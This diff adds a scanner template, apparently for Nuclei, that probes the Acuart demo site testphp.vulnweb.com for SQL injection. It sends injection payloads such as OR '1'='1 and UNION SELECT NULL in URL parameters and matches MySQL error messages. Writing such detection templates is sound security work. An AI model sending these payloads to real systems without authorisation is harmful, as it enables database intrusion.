@@ -1,0 +1,33 @@
+id: acuart-sqli
+
+info:
+  name: Acuart (testphp.vulnweb.com) - SQL Injection
+  author: Kalkaneus Team
+  severity: high
+  description: SQL injection in Acuart demo application
+  reference:
+    - http://testphp.vulnweb.com/
+  tags: sqli,acuart,testphp
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/artists.php?artist=1'"
+      - "{{BaseURL}}/artists.php?artist=1' OR '1'='1"
+      - "{{BaseURL}}/artists.php?artist=1 UNION SELECT NULL--"
+      - "{{BaseURL}}/listproducts.php?cat=1'"
+      - "{{BaseURL}}/listproducts.php?cat=1' OR '1'='1"
+    
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "mysql_fetch"
+          - "SQL syntax"
+          - "Warning: mysql"
+          - "mysqli"
+        condition: or
+        
+      - type: regex
+        regex:
+          - "You have an error in your SQL syntax"
